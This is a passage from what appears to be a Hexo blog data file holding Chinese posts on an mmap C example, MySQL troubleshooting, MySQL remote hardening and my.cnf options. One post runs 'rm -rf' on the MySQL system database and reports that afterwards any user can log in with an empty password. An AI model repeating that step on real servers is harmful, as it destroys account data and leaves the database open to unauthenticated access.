mmap(NULL, realLen, PROT_READ|PROT_WRITE, MAP_SHARED, fd, realOffset)) == (void *)-1) {\n        perror(\"mmap\");\n        exit(1);\n    }\n    close(fd);\n    memset(buff,0x00,sizeof(buff));\n    memcpy(buff, mmaped, realLen);\n    printf(\"buff:[%s]n\", buff);\n    munmap(mmaped, realLen);\n    return 0;\n}\nroot@bt:~/c# gcc mmap.c\nroot@bt:~/c# ./a.out data.txt 4096  7\nSystem Page_Size:[4096]\nrealOffset:[4096]\nrealLen:[7]\nbuff:[567890\n]\nroot@bt:~/c# ./a.out data.txt 1  7\nSystem Page_Size:[4096]\nrealOffset:[0]\nrealLen:[8]\nbuff:[12345678]\nroot@bt:~/c#\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>mmap原型为：<br></pre><br>SYNOPSIS<br>       #include &lt;sys&#x2F;mman.h&gt;<br>       void *mmap(void *addr, size_t length, int prot, int flags,int fd, off_t offset);<br>       int munmap(void *addr, size_t length);<br></pre><br>offset 必须为PAGE_SIZE的整数倍<br>LINUX下面获取PAGE_SIZE的命令</p>\n<pre>\nroot@bt:~/c# getconf PAGE_SIZE\n4096\n</pre>\n<pre>\nroot@bt:~/c# cat mmap.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <sys/mman.h>\n#include <errno.h>\nint main(int argc, char **argv)\n{\n    char buff[1024];\n    char *mmaped;\n    int fd;\n    int offset, realOffset, length, realLen;\n    if(argc != 4) {\n        printf(\"Usage:%s <filename> <offset> <length>n\", argv[0]);\n        exit(1);\n    }\n    if((fd=open(argv[1], O_RDWR)) < 0) {\n        perror(\"open\");\n        exit(1);\n    }\n    offset = atoi(argv[2]);\n    length = atoi(argv[3]);\n    printf(\"System Page_Size:[%ld]n\", sysconf(_SC_PAGE_SIZE));\n    realOffset = offset & ~(sysconf(_SC_PAGE_SIZE) - 1);  //必须为PAGE_SIZE倍数\n    printf(\"realOffset:[%d]n\", realOffset);\n    realLen = length + offset - realOffset;\n    printf(\"realLen:[%d]n\", realLen);\n    if((mmaped = mmap(NULL, realLen, PROT_READ|PROT_WRITE, MAP_SHARED, fd, realOffset)) == (void *)-1) {\n        perror(\"mmap\");\n        exit(1);\n    }\n    close(fd);\n    memset(buff,0x00,sizeof(buff));\n    memcpy(buff, mmaped, realLen);\n    printf(\"buff:[%s]n\", buff);\n    munmap(mmaped, realLen);\n    return 0;\n}\nroot@bt:~/c# gcc mmap.c\nroot@bt:~/c# ./a.out data.txt 4096  7\nSystem Page_Size:[4096]\nrealOffset:[4096]\nrealLen:[7]\nbuff:[567890\n]\nroot@bt:~/c# ./a.out data.txt 1  7\nSystem Page_Size:[4096]\nrealOffset:[0]\nrealLen:[8]\nbuff:[12345678]\nroot@bt:~/c#\n</pre>"},{"title":"mysql数据库删除后，网站连接数据库正常。","date":"2011-09-06T09:34:00.000Z","_content":"今天，（vmware里的）网站程序怎么也连接不上了，提示连接不上数据库，之前好好的，没有做什么操作啊。\n密码是正确的，终端能连接上，就是php连接不上，php也没有什么问题啊。郁闷死了。怒之，删mysql数据库，重建。\nrm -rf /usr/local/mysql/var/mysql&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #直接删除的数据\nmysql_install_db --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/var\nmysql -u root -p&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #进入mysql模式\nshow databases；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #有其他数据库\n可笑的是，现在网站能访问了，网站连接数据库的用户密码没有修改。\n快速进入mysql表\nuse mysql\nselect user，host，password from user；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #确定是创建的，没有其他的用户。\nmysql -u 任意用户 -p&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #任意用户，空密码能进入\nmysqladmin -uroot password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #初始化密码，提示连接localhost 失败，0.0.0.0:3306正常监听。\n看mysql日志正常，有点小郁闷。没有初始化密码前，不需要验证码。只要有对应的数据库就可以吗。晕。\n&nbsp;","source":"_posts/mysql数据库删除后，网站连接数据库正常。.md","raw":"title: mysql数据库删除后，网站连接数据库正常。\ncategories: [Mysql]\ntags: []\ndate: 2011-09-06 17:34:00\n---\n今天，（vmware里的）网站程序怎么也连接不上了，提示连接不上数据库，之前好好的，没有做什么操作啊。\n密码是正确的，终端能连接上，就是php连接不上，php也没有什么问题啊。郁闷死了。怒之，删mysql数据库，重建。\nrm -rf /usr/local/mysql/var/mysql&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #直接删除的数据\nmysql_install_db --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/var\nmysql -u root -p&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #进入mysql模式\nshow databases；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #有其他数据库\n可笑的是，现在网站能访问了，网站连接数据库的用户密码没有修改。\n快速进入mysql表\nuse mysql\nselect user，host，password from user；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #确定是创建的，没有其他的用户。\nmysql -u 任意用户 -p&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #任意用户，空密码能进入\nmysqladmin -uroot password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #初始化密码，提示连接localhost 失败，0.0.0.0:3306正常监听。\n看mysql日志正常，有点小郁闷。没有初始化密码前，不需要验证码。只要有对应的数据库就可以吗。晕。\n&nbsp;","slug":"mysql数据库删除后，网站连接数据库正常。","published":1,"updated":"2023-04-22T05:38:44.842Z","_id":"clgrjlxi3004o7opigjwp6n9r","comments":1,"layout":"post","photos":[],"link":"","content":"<p>今天，（vmware里的）网站程序怎么也连接不上了，提示连接不上数据库，之前好好的，没有做什么操作啊。<br>密码是正确的，终端能连接上，就是php连接不上，php也没有什么问题啊。郁闷死了。怒之，删mysql数据库，重建。<br>rm -rf &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;var&#x2F;mysql&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #直接删除的数据<br>mysql_install_db –user&#x3D;mysql –basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql –datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;var<br>mysql -u root -p&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #进入mysql模式<br>show databases；&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #有其他数据库<br>可笑的是，现在网站能访问了，网站连接数据库的用户密码没有修改。<br>快速进入mysql表<br>use mysql<br>select user，host，password from user；&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #确定是创建的，没有其他的用户。<br>mysql -u 任意用户 -p&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #任意用户，空密码能进入<br>mysqladmin -uroot password&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #初始化密码，提示连接localhost 失败，0.0.0.0:3306正常监听。<br>看mysql日志正常，有点小郁闷。没有初始化密码前，不需要验证码。只要有对应的数据库就可以吗。晕。<br>&amp;nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>今天，（vmware里的）网站程序怎么也连接不上了，提示连接不上数据库，之前好好的，没有做什么操作啊。<br>密码是正确的，终端能连接上，就是php连接不上，php也没有什么问题啊。郁闷死了。怒之，删mysql数据库，重建。<br>rm -rf &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;var&#x2F;mysql&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #直接删除的数据<br>mysql_install_db –user&#x3D;mysql –basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql –datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;var<br>mysql -u root -p&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #进入mysql模式<br>show databases；&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #有其他数据库<br>可笑的是，现在网站能访问了，网站连接数据库的用户密码没有修改。<br>快速进入mysql表<br>use mysql<br>select user，host，password from user；&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #确定是创建的，没有其他的用户。<br>mysql -u 任意用户 -p&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #任意用户，空密码能进入<br>mysqladmin -uroot password&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #初始化密码，提示连接localhost 失败，0.0.0.0:3306正常监听。<br>看mysql日志正常，有点小郁闷。没有初始化密码前，不需要验证码。只要有对应的数据库就可以吗。晕。<br>&amp;nbsp;</p>\n"},{"title":"mysql远程安全设置","date":"2013-04-13T04:43:02.000Z","_content":"最近又出了mysql远程漏洞,简单说一下mysql远程安全的设置小技巧。\n1.关闭远程连接\nmysql默认是开启3306端口,默认也不允许远程连接的。\n<pre>\nmysql> select host,user from user;\n+-----------+--------------+\n| host      | user         |\n+-----------+--------------+\n| 127.0.0.1 | root         |\n| localhost | root         |\n+-----------+--------------+\n2 rows in set (0.00 sec)\n</pre>\n2.如果不使用端口通信通信的话,建议关闭监听端口,使用socket通信\n在mysql配置文件中my.cnf中[mysqld]中\n添加skip-networking\n如果本地使用端口通信的话,或者使用局域网通信的话,建议只监听内网端口\n在mysql配置文件中my.cnf中[mysqld]中\n添加bind-address=127.0.0.1\n或者添加bind-address=内网地址\n3.不建议使用远程端口,如果真的使用远程或者远程主从,修改你的端口和授权地址。\n修改端口\n在mysql配置文件中my.cnf中[mysqld]中\n添加port=12345\n添加授权的话，先为数据库创建一个用户test,修改授权ip即可,具体权限可以根据应用设置。\n<pre>\nmysql>update user set host = '1.1.1.1' where user = 'test';\nmysql> select host,user from user where user='test';\n+-----------+--------------+\n| host      | user         |\n+-----------+--------------+\n| 1.1.1.1   | test         |\n+-----------+--------------+\n1 row in set (0.00 sec)\n</pre>","source":"_posts/mysql远程安全设置.md","raw":"title: mysql远程安全设置\ncategories: [网络安全]\ntags: []\ndate: 2013-04-13 12:43:02\n---\n最近又出了mysql远程漏洞,简单说一下mysql远程安全的设置小技巧。\n1.关闭远程连接\nmysql默认是开启3306端口,默认也不允许远程连接的。\n<pre>\nmysql> select host,user from user;\n+-----------+--------------+\n| host      | user         |\n+-----------+--------------+\n| 127.0.0.1 | root         |\n| localhost | root         |\n+-----------+--------------+\n2 rows in set (0.00 sec)\n</pre>\n2.如果不使用端口通信通信的话,建议关闭监听端口,使用socket通信\n在mysql配置文件中my.cnf中[mysqld]中\n添加skip-networking\n如果本地使用端口通信的话,或者使用局域网通信的话,建议只监听内网端口\n在mysql配置文件中my.cnf中[mysqld]中\n添加bind-address=127.0.0.1\n或者添加bind-address=内网地址\n3.不建议使用远程端口,如果真的使用远程或者远程主从,修改你的端口和授权地址。\n修改端口\n在mysql配置文件中my.cnf中[mysqld]中\n添加port=12345\n添加授权的话，先为数据库创建一个用户test,修改授权ip即可,具体权限可以根据应用设置。\n<pre>\nmysql>update user set host = '1.1.1.1' where user = 'test';\nmysql> select host,user from user where user='test';\n+-----------+--------------+\n| host      | user         |\n+-----------+--------------+\n| 1.1.1.1   | test         |\n+-----------+--------------+\n1 row in set (0.00 sec)\n</pre>","slug":"mysql远程安全设置","published":1,"updated":"2023-04-22T05:38:44.845Z","_id":"clgrjlxi6004r7opi3r56cr5n","comments":1,"layout":"post","photos":[],"link":"","content":"<p>最近又出了mysql远程漏洞,简单说一下mysql远程安全的设置小技巧。<br>1.关闭远程连接<br>mysql默认是开启3306端口,默认也不允许远程连接的。</p>\n<pre>\nmysql> select host,user from user;\n+-----------+--------------+\n| host      | user         |\n+-----------+--------------+\n| 127.0.0.1 | root         |\n| localhost | root         |\n+-----------+--------------+\n2 rows in set (0.00 sec)\n</pre>\n<p>2.如果不使用端口通信通信的话,建议关闭监听端口,使用socket通信<br>在mysql配置文件中my.cnf中[mysqld]中<br>添加skip-networking<br>如果本地使用端口通信的话,或者使用局域网通信的话,建议只监听内网端口<br>在mysql配置文件中my.cnf中[mysqld]中<br>添加bind-address&#x3D;127.0.0.1<br>或者添加bind-address&#x3D;内网地址<br>3.不建议使用远程端口,如果真的使用远程或者远程主从,修改你的端口和授权地址。<br>修改端口<br>在mysql配置文件中my.cnf中[mysqld]中<br>添加port&#x3D;12345<br>添加授权的话，先为数据库创建一个用户test,修改授权ip即可,具体权限可以根据应用设置。</p>\n<pre>\nmysql>update user set host = '1.1.1.1' where user = 'test';\nmysql> select host,user from user where user='test';\n+-----------+--------------+\n| host      | user         |\n+-----------+--------------+\n| 1.1.1.1   | test         |\n+-----------+--------------+\n1 row in set (0.00 sec)\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>最近又出了mysql远程漏洞,简单说一下mysql远程安全的设置小技巧。<br>1.关闭远程连接<br>mysql默认是开启3306端口,默认也不允许远程连接的。</p>\n<pre>\nmysql> select host,user from user;\n+-----------+--------------+\n| host      | user         |\n+-----------+--------------+\n| 127.0.0.1 | root         |\n| localhost | root         |\n+-----------+--------------+\n2 rows in set (0.00 sec)\n</pre>\n<p>2.如果不使用端口通信通信的话,建议关闭监听端口,使用socket通信<br>在mysql配置文件中my.cnf中[mysqld]中<br>添加skip-networking<br>如果本地使用端口通信的话,或者使用局域网通信的话,建议只监听内网端口<br>在mysql配置文件中my.cnf中[mysqld]中<br>添加bind-address&#x3D;127.0.0.1<br>或者添加bind-address&#x3D;内网地址<br>3.不建议使用远程端口,如果真的使用远程或者远程主从,修改你的端口和授权地址。<br>修改端口<br>在mysql配置文件中my.cnf中[mysqld]中<br>添加port&#x3D;12345<br>添加授权的话，先为数据库创建一个用户test,修改授权ip即可,具体权限可以根据应用设置。</p>\n<pre>\nmysql>update user set host = '1.1.1.1' where user = 'test';\nmysql> select host,user from user where user='test';\n+-----------+--------------+\n| host      | user         |\n+-----------+--------------+\n| 1.1.1.1   | test         |\n+-----------+--------------+\n1 row in set (0.00 sec)\n</pre>"},{"title":"MySQL中my.cnf文件选项","date":"2011-04-27T01:23:00.000Z","_content":"MySQL中my.cnf文件选项<br />\nmysqld服务器维护两种变量。全局变量影响服务器的全局操作。会话变量影响具体客户端连接相关操作。<br />可以在选项文件或命令行中设置全局变量。<br />用Set命令设置会话变量，当然它也可以设置全局变量。\n就像oracle里面的初始化参数文件一样。下面是一些常用的选项说明，MySQL的管方文档上也有。</p><br />\n如<br />mysql&gt; SET GLOBAL sort_buffer_size = 10 * 1024 * 1024;<br />mysql&gt; SET SESSION sort_buffer_size = 10 * 1024 * 1024;\n如果你想用SET语句限制系统变量可设的最大值，可以在服务器启动时通过--maximum-var_name形式的选项来指定。<br />例如，要想防止query_cache_size的值运行时超过32MB，使用选项--maximum-query_cache_size=32M。\nmysqld_safe选项<br />--basedir=path<br />MySQL安装目录的路径。\n--core-file-size<br />mysqld能够创建的内核文件的大小。选项值传递给ulimit -c。\n--datadir=path<br />数据目录的路径。\n--defaults-file=path<br />读取的代替通用选项文件的选项文件名。如果给出，必须首选该选项。\n--log-error=path<br />将错误日志写入给定的文件。\n-nice=priority<br />使用nice程序根据给定值来设置服务器的调度优先级。\n--open-files-limit=count<br />mysqld能够打开的文件的数量。选项值传递给 ulimit -n。请注意你需要用root启动mysqld_safe来保证正确工作！\n--pid-file=path<br />进程ID文件的路径。\n--port=port_num<br />用来帧听TCP/IP连接的端口号。端口号必须为1024或更大值，除非MySQL以root系统用户运行。<br />每个mysqld的Unix套接字文件和TCP/IP端口号必须不同。\n--ledir=path<br />包含mysqld程序的目录的路径。使用该选项来显式表示服务器位置。\n--no-defaults<br />不要读任何选项文件。如果给出，必须首选该选项。\n--skip-character-set-client-handshake<br />忽略客户端发送的字符集信息，使用服务器的默认字符集。\n--socket=path<br />用于本地连接的Unix套接字文件。<br />每个mysqld的Unix套接字文件和TCP/IP端口号必须不同。\n--timezone=zone<br />为给定的选项值设置TZ时区环境变量。\n--user={user_name | user_id}<br />以用户名user_name或数字用户ID user_id运行mysqld服务器。<br />该&quot;用户&quot;指系统登录账户，而不是 授权表中的MySQL用户。\n<br />mysqld命令行选项<br />mysqld从[mysqld]和[server]组读取选项\n--ansi<br />使用标准(ANSI)SQL语法代替MySQL语法。\n--basedir=path, -b path<br />MySQL安装目录的路径。通常所有路径根据该路径来解析。\n--bootstrap<br />mysql_install_db脚本使用该选项来创建MySQL授权表，不需要启动MySQL服务器\n--console<br />将错误日志消息写入stderr和stdout，即使指定了--log-error。\n--character_sets_dir=path<br />字符集安装的目录。\n--chroot=path<br />通过chroot()系统调用在启动过程中将mysqld服务器放入一个封闭环境中。这是推荐的一个安全措施。请注意使用该选项可以 限制LOAD DATA INFILE和SELECT ... INTO OUTFILE。\n--character_set_server=charset<br />使用charset作为 默认服务器字符集。\n--core_file<br />如果mysqld终止，写内核文件。\n--datadir=path, -h path <br />数据目录的路径。\n--default_table_type=type<br />设置表的默认类型。\n--debug[=debug_options], -# [debug_options]<br />如果MySQL配置了--with-debug，你可以使用该选项来获得一个跟踪文件，跟踪mysqld正进行的操作。debug_options字符串通常为'd:t:o，file_name'。\n--default_time_zone=type<br />设置默认服务器时区。该选项设置全局time_zone系统变量。默认时区与系统时区相同(用system_time_zone系统变量值给定)\n--delay_key_write[= OFF | ON | ALL]<br />如何使用DELAYED KEYS选项。键写入延迟会造成再次写MyISAM表时键缓冲区不能被清空。该选项只适用MyISAM表。<br />OFF DELAY_KEY_WRITE被忽略。<br />ON MySQL在CREATE TABLE中用DELAY_KEY_WRITE选项。这是 默认值。<br />ALL 用启用DELAY_KEY_WRITE选项创建表的相同方法对所有新打开表的进行处理。<br />如果启用了DELAY_KEY_WRITE，说明使用该项的表的键缓冲区在每次更新索引时不被清空，只有关闭表时才清空。<br />但如果你使用该特性，你应用--myisam_recover选项启动服务器，为所有MyISAM表添加自动检查。\n--external_locking<br />用系统锁定。请注意如果你在lockd不能完全工作的系统上使用该选项(例如在Linux中)，mysqld容易死锁。<br />如果你在许多MySQL进程中使用该选项来更新MyISAM表，你必须确保满足下述条件：<br />使用正被另一个进程更新的表的查询的缓存不可使用。<br />不应在共享表中使用--delay-key-write=ALL或DELAY_KEY_WRITE=1。<br />最简单的方法是结合使用--external-locking和--delay-key-write=OFF --query-cache-size=0。<br />(默认不能实现，因为在许多设置中，结合使用上述选项很有用）。\n<br />--flush<br />执行SQL语句后向硬盘上清空更改。一般情况执行SQL语句后 MySQL向硬盘写入所有更改，让操作系统处理与硬盘的同步。\n<br />--init_file=file<br />启动时从该文件读SQL语句。每个语句必须在同一行中并且不应包括注释。\n<br />--language=lang_name, -L lang_name<br />用给定语言给出客户端错误消息。默认情况下，mysqld用英语给出错误消息。\n--large_pages<br />一些硬件/操作系统架构支持大于 默认值(通常4 KB)的内存页。实际支持取决于使用的硬件和OS。<br />大量访问内存的应用程序通过 使用较大的页，降低了Translation Lookaside Buffer (TLB)损失，可以改善性能。 <br />默认情况下该选项被禁用。\n---log[=file], -l [file]\n如果你想要知道mysqld内部发生了什么，你应该用--log[=file_name]或-l [file_name]选项启动它。如果没有给定file_name的值， 默认名是host_name.log。所有连接和语句被记录到日志文件。当你怀疑在客户端发生了错误并想确切地知道该客户端发送给mysqld的语句时，该日志可能非常有用。<br />mysqld按照它接收的顺序记录语句到查询日志。这可能与执行的顺序不同。\n--log_bin=[file]<br />二进制日志文件。将更改数据的所有查询记入该文件。用于备份和复制。<br />建议指定一个文件名,否则MySQL使用host_name-bin作为日志文件基本名。<br />运行服务器时若启用二进制日志则性能大约慢1%。\n--binlog_do_db=db_name<br />告诉主服务器，如果当前的数据库(即USE选定的数据库)是db_name，应将更新记录到二进制日志中。\n--binlog_ignore_db=db_name<br />告诉主服务器，如果当前的数据库(即USE选定的数据库)是db_name，不应将更新保存到二进制日志中。\n--log_error[=file]<br />该文件的日志错误和启动消息.<br />如果你不指定文件名，MySQL使用host_name.err作为文件名。如果文件名没有扩展名，则加上.err扩展名。\n<br />--log_isam[=file] <br />将所有MyISAM更改记入该文件\n--log_slow_queries[=file] <br />将所有执行时间超过long_query_time 秒的查询记入该文件。\n--log_warnings, -W<br />将警告例如Aborted connection...打印到错误日志。建议启用该选项，默认也是启用的。\n--memlock<br />将mysqld 进程锁定在内存中。请注意使用该选项时需要以root运行服务器，但从安全考虑并不是一个好注意。\n--myisam_recover [=option[,option...]]]<br />存储引擎MyISAM设置为恢复模式。该选项值是DEFAULT、BACKUP、FORCE或QUICK值的任何组合。<br />如果你指定多个值，用逗号","source":"_posts/MySQL中my.cnf文件选项.md","raw":"title: MySQL中my.cnf文件选项\ncategories: [Mysql]\ntags: []\ndate: 2011-04-27 09:23:00\n---\nMySQL中my.cnf文件选项<br />\nmysqld服务器维护两种变量。全局变量影响服务器的全局操作。会话变量影响具体客户端连接相关操作。<br />可以在选项文件或命令行中设置全局变量。<br />用Set命令设置会话变量，当然它也可以设置全局变量。\n就像oracle里面的初始化参数文件一样。下面是一些常用的选项说明，MySQL的管方文档上也有。</p><br />\n如<br />mysql&gt; SET GLOBAL sort_buffer_size = 10 * 1024 * 1024;<br />mysql&gt; SET SESSION sort_buffer_size = 10 * 1024 * 1024;\n如果你想用SET语句限制系统变量可设的最大值，可以在服务器启动时通过--maximum-var_name形式的选项来指定。<br />例如，要想防止query_cache_size的值运行时超过32MB，使用选项--maximum-query_cache_size=32M。\nmysqld_safe选项<br />--basedir=path<br />MySQL安装目录的路径。\n--core-file-size<br />mysqld能够创建的内核文件的大小。选项值传递给ulimit -c。\n--datadir=path<br />数据目录的路径。\n--defaults-file=path<br />读取的代替通用选项文件的选项文件名。如果给出，必须首选该选项。\n--log-error=path<br />将错误日志写入给定的文件。\n-nice=priority<br />使用nice程序根据给定值来设置服务器的调度优先级。\n--open-files-limit=count<br />mysqld能够打开的文件的数量。选项值传递给 ulimit 